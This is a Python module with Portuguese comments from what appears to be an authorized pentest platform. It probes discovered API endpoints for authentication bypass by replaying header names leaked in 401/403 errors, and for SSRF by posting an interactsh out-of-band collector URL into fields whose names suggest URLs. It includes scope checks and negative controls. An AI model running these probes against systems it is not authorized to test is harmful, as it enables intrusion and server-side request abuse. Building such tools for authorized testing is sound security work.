"""Sondagem adaptativa GENÉRICA de mensagens de erro verbosas — sem lista fixa.

Muitas APIs descrevem, na própria resposta de erro, exatamente o que esperam:
um 401/403 verboso lista os headers de autenticação aceitos; um 400/422
verboso lista os campos obrigatórios do corpo JSON. Um pentester experiente
lê essas mensagens e sonda de volta com os nomes exatos que o próprio alvo
revelou — nunca com uma lista fixa de nomes conhecidos a priori.

Este módulo generaliza essa técnica:
  1. `probe_auth_bypass` — manda uma baseline sem credenciais; se a resposta
     for 401/403 com corpo, extrai TOKENS com formato de header (regex, não
     lista fixa) e tenta de novo com esses headers + valores genéricos
     (incluindo o domínio-apex do próprio alvo como candidato a Origin — ver
     `scan_scope.registrable_domain`). Detecta bypass por TRANSIÇÃO de status
     (401/403 -> qualquer outra coisa), não por um código fixo esperado.
  2. `probe_json_field_hints` — manda um corpo JSON vazio/mínimo a um
     endpoint POST; extrai nomes de campo de uma resposta de validação
     verbosa (chave "field"/"param"/"name", ou texto livre "<campo> is
     required"). Genérico: não assume nomes de campo específicos.
  3. `classify_ssrf_candidate_fields` — classifica os nomes de campo
     descobertos (SEJA QUAL FOR o nome, não um caso específico) contra um
     dicionário público, estabelecido pela indústria, de nomes de parâmetro
     historicamente associados a SSRF (o mesmo tipo de lista que acompanha
     wordlists de SSRF do Burp/SecLists) — não é a resposta de um alvo
     específico, é o mesmo dicionário que se aplicaria a qualquer alvo.
  4. `confirm_ssrf_via_oob` — popula o campo candidato com uma URL de
     coletor OOB (interactsh) e confirma via callback recebido.

Usado por app_pentest.py / offensive reasoning como uma etapa adicional,
executada em QUALQUER endpoint descoberto — o algoritmo não sabe de
antemão qual será a resposta do alvo.
"""

from __future__ import annotations

import json
import re
import time
from typing import Any
from urllib.parse import urlparse

import httpx

from app.services.scan_scope import registrable_domain

_TIMEOUT = httpx.Timeout(connect=6.0, read=12.0, write=6.0, pool=6.0)

# Tokens com formato de header HTTP (x-*, Authorization, Bearer, Origin,
# Cookie, api-key/apikey em qualquer grafia). Isto é reconhecimento de
# FORMATO/estrutura, não uma lista de nomes específicos de um alvo.
_HEADER_HINT_RE = re.compile(
    r"\b(x-[a-z][a-z0-9-]{1,40}|Authorization|Bearer|Origin|Cookie|api[-_]?key)\b",
    re.IGNORECASE,
)

_AUTH_STATUS = {401, 403}

# Placeholder genérico. A evidência empírica (testado contra alvo real) é que
# APIs com esse padrão de bug aceitam qualquer valor não-vazio para os
# headers "tenant"/"org" hintados — o ponto do bypass é a ausência de
# validação real, não um valor mágico específico.
_GENERIC_PLACEHOLDER = "1"

# Dicionário público de nomes de parâmetro historicamente associados a SSRF
# (mesmo tipo de lista usada por wordlists de SSRF do Burp/SecLists) — não é
# derivado de nenhum alvo específico; aplica-se genericamente a qualquer
# campo descoberto, seja qual for seu nome real.
SSRF_PARAM_HINTS = frozenset({
    "url", "uri", "link", "href", "src", "source", "target", "dest",
    "destination", "redirect", "return", "next", "continue", "callback",
    "webhook", "endpoint", "host", "domain", "path", "proxy", "feed",
    "avatar", "image", "fetch", "load", "file", "document", "page",
    "site", "resource", "location", "remote",
})


def _header_hints_from_body(body: str) -> list[str]:
    """Extrai tokens com formato de header HTTP de um texto de erro qualquer."""
    if not body:
        return []
    seen: list[str] = []
    for match in _HEADER_HINT_RE.finditer(body[:4000]):
        token = match.group(1)
        normalized = token if token.lower().startswith("x-") else token
        if normalized not in seen:
            seen.append(normalized)
    return seen


def _candidate_header_value(token: str, target_host: str) -> tuple[str, str] | None:
    """Mapeia um token hintado para (nome-do-header, valor-candidato).

    O VALOR é sempre derivado genericamente: para Origin, o domínio-apex do
    próprio alvo (heurística padrão de bypass de allowlist — nunca um valor
    fixo de um alvo específico); para o resto, um placeholder genérico.
    """
    low = token.lower()
    if low == "origin":
        apex = registrable_domain(target_host)
        if not apex:
            return None
        return ("Origin", f"https://{apex}")
    if low in ("authorization",):
        return ("Authorization", f"Bearer {_GENERIC_PLACEHOLDER}")
    if low == "bearer":
        return None  # coberto por Authorization acima; evita header duplicado
    if low == "cookie":
        return ("Cookie", f"session={_GENERIC_PLACEHOLDER}")
    if re.match(r"^api[-_]?key$", low):
        return ("X-Api-Key", _GENERIC_PLACEHOLDER)
    if low.startswith("x-"):
        return (token, _GENERIC_PLACEHOLDER)
    return None


_ALTERNATIVE_SPLIT_RE = re.compile(r",?\s*\b(?:or|ou)\b\s*", re.IGNORECASE)


def _candidate_header_sets(body: str, target_host: str) -> list[dict[str, str]]:
    """Build ordered candidate header-sets to try, most-specific first.

    Auth-scheme error messages typically describe ALTERNATIVES ("provide A,
    or B, or C with D") — sending every hinted header together often
    backfires, because a wrong-but-present credential of one scheme (e.g. a
    placeholder x-api-key) can make the server reject before it ever
    considers a different, otherwise-satisfiable scheme. So: try each
    "or"-separated phrase's own header set in isolation first (this is a
    generic split on the English/Portuguese alternative-listing keyword, not
    a specific header list), then fall back to single headers, then to
    everything combined as a last resort for permissive/additive schemes.
    """
    all_hints = _header_hints_from_body(body)
    if not all_hints:
        return []

    def _mapped_set(tokens: list[str]) -> dict[str, str]:
        out: dict[str, str] = {}
        for token in tokens:
            mapped = _candidate_header_value(token, target_host)
            if mapped:
                out[mapped[0]] = mapped[1]
        return out

    phrase_sets: list[dict[str, str]] = []
    for phrase in _ALTERNATIVE_SPLIT_RE.split(body[:4000]):
        phrase_hints = _header_hints_from_body(phrase)
        mapped = _mapped_set(phrase_hints)
        if mapped and mapped not in phrase_sets:
            phrase_sets.append(mapped)

    single_sets = [
        s for token in all_hints
        if (s := _mapped_set([token])) and s not in phrase_sets
    ]
    combined = _mapped_set(all_hints)

    candidates = list(phrase_sets) + single_sets
    if combined and combined not in candidates:
        candidates.append(combined)
    return candidates


def probe_auth_bypass(
    url: str,
    *,
    method: str = "POST",
    baseline_json: dict | None = None,
    client: httpx.Client | None = None,
    max_attempts: int = 12,
) -> dict[str, Any]:
    """Sonda bypass de autenticação lendo o próprio erro do alvo.

    Retorna:
      {"checked": bool, "baseline_status": int, "hints": [...],
       "attempts": int, "bypass_detected": bool, "headers_used": {...} | None,
       "new_status": int | None, "evidence_excerpt": str | None}
    """
    own_client = client is None
    client = client or httpx.Client(timeout=_TIMEOUT, verify=True, follow_redirects=False)
    try:
        try:
            baseline = client.request(method, url, json=baseline_json if baseline_json is not None else {})
        except Exception as exc:
            return {"checked": False, "error": str(exc)}

        result: dict[str, Any] = {
            "checked": True,
            "baseline_status": baseline.status_code,
            "hints": [],
            "attempts": 0,
            "bypass_detected": False,
            "headers_used": None,
            "new_status": None,
            "negative_control_status": None,
            "confirmation_status": None,
            "stable_transition": False,
            "evidence_excerpt": None,
        }
        if baseline.status_code not in _AUTH_STATUS:
            return result  # nada a sondar: já não está bloqueado por auth

        body = baseline.text or ""
        result["hints"] = _header_hints_from_body(body)
        if not result["hints"]:
            return result

        # A random, unrelated header is the negative control for an unstable
        # auth boundary or a backend that changes status for every request.
        try:
            control = client.request(
                method,
                url,
                json=baseline_json if baseline_json is not None else {},
                headers={"X-EASM-Negative-Control": "1"},
            )
        except Exception:
            return result
        result["negative_control_status"] = control.status_code
        if control.status_code not in _AUTH_STATUS:
            return result

        target_host = httpx.URL(url).host or ""
        for candidate_headers in _candidate_header_sets(body, target_host)[:max_attempts]:
            result["attempts"] += 1
            try:
                retry = client.request(
                    method, url,
                    json=baseline_json if baseline_json is not None else {},
                    headers=candidate_headers,
                )
            except Exception:
                continue
            if retry.status_code not in _AUTH_STATUS and retry.status_code != baseline.status_code:
                try:
                    confirmation = client.request(
                        method,
                        url,
                        json=baseline_json if baseline_json is not None else {},
                        headers=candidate_headers,
                    )
                except Exception:
                    continue
                result["confirmation_status"] = confirmation.status_code
                if confirmation.status_code != retry.status_code:
                    continue
                result["bypass_detected"] = True
                result["stable_transition"] = True
                result["headers_used"] = candidate_headers
                result["new_status"] = retry.status_code
                result["evidence_excerpt"] = (retry.text or "")[:1000]
                break
        return result
    finally:
        if own_client:
            client.close()


def probe_json_field_hints(
    url: str,
    *,
    method: str = "POST",
    headers: dict[str, str] | None = None,
    client: httpx.Client | None = None,
) -> dict[str, Any]:
    """Sonda nomes de campo JSON exigidos, lendo o erro de validação do alvo.

    Manda um corpo vazio a um endpoint POST/PUT e extrai nomes de campo de
    QUALQUER estrutura de erro que mencione campos — estruturada (lista de
    dicts com chave field/param/name) ou texto livre ("<campo> is required").
    """
    own_client = client is None
    client = client or httpx.Client(timeout=_TIMEOUT, verify=True, follow_redirects=False)
    try:
        try:
            resp = client.request(method, url, json={}, headers=headers or {})
        except Exception as exc:
            return {"checked": False, "error": str(exc)}

        result: dict[str, Any] = {
            "checked": True,
            "status": resp.status_code,
            "field_hints": [],
        }
        if resp.status_code not in (400, 422):
            return result

        body = resp.text or ""
        fields: list[str] = []

        try:
            parsed = json.loads(body)
        except (ValueError, TypeError):
            parsed = None

        def _walk(node: Any) -> None:
            if isinstance(node, dict):
                for key in ("field", "param", "parameter", "name", "key"):
                    value = node.get(key)
                    if isinstance(value, str) and value and value not in fields:
                        fields.append(value)
                for value in node.values():
                    _walk(value)
            elif isinstance(node, list):
                for item in node:
                    _walk(item)

        if parsed is not None:
            _walk(parsed)

        for match in re.finditer(r'"([a-zA-Z_][a-zA-Z0-9_]{0,40})"\s+(?:is required|must be)', body[:4000]):
            if match.group(1) not in fields:
                fields.append(match.group(1))

        result["field_hints"] = fields
        return result
    finally:
        if own_client:
            client.close()


def classify_ssrf_candidate_fields(field_hints: list[str]) -> list[str]:
    """Filtra os campos hintados contra o dicionário genérico de nomes SSRF-prone.

    Match por substring (case-insensitive) contra `SSRF_PARAM_HINTS` — não
    exige igualdade exata, então "webhookUrl"/"callback_url"/"targetUri"
    também são capturados pelo mesmo dicionário genérico.
    """
    candidates = []
    for field in field_hints:
        low = field.lower()
        if any(hint in low for hint in SSRF_PARAM_HINTS):
            candidates.append(field)
    return candidates


def _matching_oob_callbacks(collector_url: str, callbacks: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Return only callbacks correlated to this exact unique collector slug."""
    collector_token = (urlparse(str(collector_url or "")).hostname or "").split(".", 1)[0]
    if not collector_token:
        return []
    return [
        callback for callback in callbacks
        if collector_token in str(callback.get("unique_id") or "")
    ]


def _candidate_endpoints(db, job, target: str) -> list[str]:
    """Alvos candidatos: a base do target + paths já descobertos por
    gobuster/dirsearch/feroxbuster/ffuf/dirsearch-api(-post) nesta mesma scan
    (persistidos como Finding — a mesma fonte que a UI usa, não um estado em
    memória paralelo).
    """
    from app.models.models import Finding
    from app.services.scan_scope import (
        authorized_scope_from_target_query,
        host_from_scope_reference,
        is_host_in_scope,
    )

    raw_target = str(target or "").strip()
    if not raw_target or raw_target.startswith("__batch__"):
        return []

    base = raw_target if raw_target.startswith(("http://", "https://")) else f"https://{raw_target}"
    base_host = host_from_scope_reference(base)
    authorized_scope = authorized_scope_from_target_query(str(job.target_query or ""))
    if not base_host or not authorized_scope or not is_host_in_scope(base_host, authorized_scope):
        return []
    candidates = [base]
    rows = (
        db.query(Finding)
        .filter(
            Finding.scan_job_id == job.id,
            Finding.domain == target,
            Finding.tool.in_(
                ["gobuster", "dirsearch", "feroxbuster", "ffuf", "dirsearch-api", "dirsearch-api-post"]
            ),
        )
        .order_by(Finding.id.desc())
        .limit(20)
        .all()
    )
    seen = {base}
    for row in rows:
        for p in (dict(row.details or {}).get("discovered_paths") or [])[:20]:
            status = str(p.get("status") or "") if isinstance(p, dict) else ""
            # 404/405, throttling and server errors are not sufficient route
            # evidence. In particular, a global 405 handler generated dozens
            # of invented REST endpoints in scan #66.
            if status.isdigit() and not (200 <= int(status) <= 403):
                continue
            path = str(p.get("path") if isinstance(p, dict) else p)
            url = path if path.startswith(("http://", "https://")) else f"{base.rstrip('/')}/{path.lstrip('/')}"
            candidate_host = host_from_scope_reference(url)
            if not candidate_host or not is_host_in_scope(candidate_host, authorized_scope):
                continue
            if url not in seen:
                seen.add(url)
                candidates.append(url)
    return candidates[:8]


def run_adaptive_probe_for_scan(db, job, target: str) -> dict:
    """Hook da PLATAFORMA: sonda bypass de auth + SSRF em campos JSON descobertos
    para um alvo do scan, genericamente (nenhum nome de header/campo é
    assumido a priori — ver docstring do módulo). Persiste achados reais.
    """
    from app.services.findings_extractor import persist_finding_dicts

    endpoints = _candidate_endpoints(db, job, target)
    raw_findings: list[dict[str, Any]] = []
    probed = 0
    inventory_updates = 0

    for url in endpoints:
        bypass = probe_auth_bypass(url)
        if not bypass.get("checked"):
            continue
        probed += 1
        if not bypass.get("bypass_detected"):
            continue

        raw_findings.append({
            "title": f"Authentication bypass via non-standard header scheme: {url}",
            "severity": "high",
            "risk_score": 7,
            "details": {
                "tool": "adaptive_probe",
                "asset": target,
                "matched_at": url,
                "url": url,
                "verification_status": "candidate",
                "evidence": (
                    f"Baseline {bypass['baseline_status']} -> {bypass['new_status']} "
                    f"with headers {bypass['headers_used']}. Response: {bypass['evidence_excerpt']}"
                ),
                "reproduction": {
                    "headers_used": bypass["headers_used"],
                    "baseline_status": bypass["baseline_status"],
                    "new_status": bypass["new_status"],
                    "negative_control_status": bypass.get("negative_control_status"),
                    "confirmation_status": bypass.get("confirmation_status"),
                    "stable_transition": bypass.get("stable_transition"),
                    "hints_read_from_error_body": bypass["hints"],
                },
                "discovery_method": (
                    "sondagem adaptativa: extraiu hints de header do próprio corpo de erro "
                    "401/403 do alvo e testou os grupos separados por 'or/ou'"
                ),
                "vuln_family": "auth_bypass",
                "cwe_id": "CWE-290",
            },
        })

        field_hints = probe_json_field_hints(url, headers=bypass["headers_used"])
        if not field_hints.get("checked"):
            continue
        observed_fields = [str(name) for name in field_hints.get("field_hints") or [] if str(name)]
        if observed_fields:
            try:
                inventory_updates += _persist_adaptive_inventory(
                    db,
                    job,
                    url=url,
                    bypass=bypass,
                    field_names=observed_fields,
                )
            except Exception:
                # Finding persistence remains useful, but the quality gate will
                # expose an inventory gap rather than inventing parameters.
                pass
        ssrf_fields = classify_ssrf_candidate_fields(observed_fields)
        if not ssrf_fields:
            continue

        try:
            from app.services import interactsh_callback as _oob
            session = _oob.register_session()
            collector = _oob.generate_oob_payload(finding_id=job.id, test_type="ssrf")
            confirm = confirm_ssrf_via_oob(
                url,
                headers=bypass["headers_used"],
                field_name=ssrf_fields[0],
                other_fields=field_hints["field_hints"],
                collector_url=collector,
            )
            time.sleep(8)
            callbacks = _oob.poll_callbacks(timeout_seconds=10) if "error" not in session else []
        except Exception:
            confirm, callbacks, collector = {"sent": False}, [], ""

        matching_callbacks = _matching_oob_callbacks(collector, callbacks)
        confirmed_via_oob = bool(matching_callbacks)
        raw_findings.append({
            "title": f"Server-Side Request Forgery via '{ssrf_fields[0]}' field: {url}",
            "severity": "critical",
            "risk_score": 9 if confirmed_via_oob else 7,
            "details": {
                "tool": "adaptive_probe",
                "asset": target,
                "matched_at": url,
                "url": url,
                "verification_status": "confirmed" if confirmed_via_oob else "candidate",
                "evidence": (
                    f"POST {ssrf_fields[0]}=<oob-collector> -> {confirm.get('status')} "
                    f"{confirm.get('response_excerpt')}"
                    + (f" | OOB callback received: {matching_callbacks[0]}" if confirmed_via_oob else "")
                ),
                "reproduction": {
                    "field": ssrf_fields[0],
                    "other_required_fields": field_hints["field_hints"],
                    "collector_url": collector,
                    "body_sent": confirm.get("body_sent"),
                    "oob_confirmed": confirmed_via_oob,
                },
                "discovery_method": (
                    "sondagem adaptativa: extraiu nomes de campo obrigatórios de um erro "
                    "de validação 400/422 e classificou contra dicionário genérico SSRF-prone"
                ),
                "vuln_family": "ssrf",
                "cwe_id": "CWE-918",
            },
        })

    created = 0
    if raw_findings:
        created = persist_finding_dicts(
            db, job, raw_findings,
            default_tool="adaptive_probe", default_target=target, source_item=None,
        )
    if inventory_updates:
        try:
            from app.services.endpoint_analysis_pipeline import analyze_endpoints_for_scan

            analyze_endpoints_for_scan(db, job)
        except Exception:
            pass
    return {
        "endpoints_probed": probed,
        "findings_created": created,
        "inventory_updates": inventory_updates,
    }


def _persist_adaptive_inventory(
    db,
    job,
    *,
    url: str,
    bypass: dict[str, Any],
    field_names: list[str],
) -> int:
    """Materialize target-observed API structure for downstream BL planning."""
    from app.services.offensive_inventory_service import OffensiveInventoryService

    inv = OffensiveInventoryService(db, job)
    endpoint = inv.upsert_endpoint(
        url,
        method="POST",
        source_tool="adaptive_probe",
        status_code=int(bypass.get("new_status") or 0) or None,
        auth_required=True,
        discovered_from="target_validation_error",
        confidence=85,
        tags=["api", "authentication", "structured-input"],
        metadata={
            "adaptive_probe": {
                "baseline_status": bypass.get("baseline_status"),
                "negative_control_status": bypass.get("negative_control_status"),
                "transition_status": bypass.get("new_status"),
                "confirmation_status": bypass.get("confirmation_status"),
                "stable_transition": bool(bypass.get("stable_transition")),
                "header_names": sorted(dict(bypass.get("headers_used") or {}).keys()),
            }
        },
    )
    for name in dict.fromkeys(field_names):
        inv.upsert_parameter(
            endpoint,
            name,
            location="body",
            type_hint="string",
            source_tool="adaptive_probe",
            metadata={"observed_from": "target_validation_error", "method": "POST"},
        )
    # New parameters invalidate the previous endpoint analysis contract.
    metadata = dict(endpoint.endpoint_metadata or {})
    metadata.pop("analysis", None)
    endpoint.endpoint_metadata = metadata
    db.add(endpoint)
    db.flush()
    return 1


def confirm_ssrf_via_oob(
    url: str,
    *,
    method: str = "POST",
    headers: dict[str, str] | None = None,
    field_name: str,
    other_fields: list[str] | None = None,
    collector_url: str,
    client: httpx.Client | None = None,
) -> dict[str, Any]:
    """Popula `field_name` com uma URL de coletor OOB e manda a requisição.

    A confirmação real (callback recebido) é responsabilidade do chamador via
    `interactsh_callback.poll_callbacks()` — esta função só dispara a
    requisição e devolve o que foi enviado, para correlação.
    """
    body: dict[str, Any] = {field_name: collector_url}
    for extra in other_fields or []:
        if extra != field_name:
            body[extra] = "test"

    own_client = client is None
    client = client or httpx.Client(timeout=_TIMEOUT, verify=True, follow_redirects=False)
    try:
        try:
            resp = client.request(method, url, json=body, headers=headers or {})
        except Exception as exc:
            return {"sent": False, "error": str(exc), "body_sent": body}
        return {
            "sent": True,
            "status": resp.status_code,
            "body_sent": body,
            "response_excerpt": (resp.text or "")[:500],
        }
    finally:
        if own_client:
            client.close()
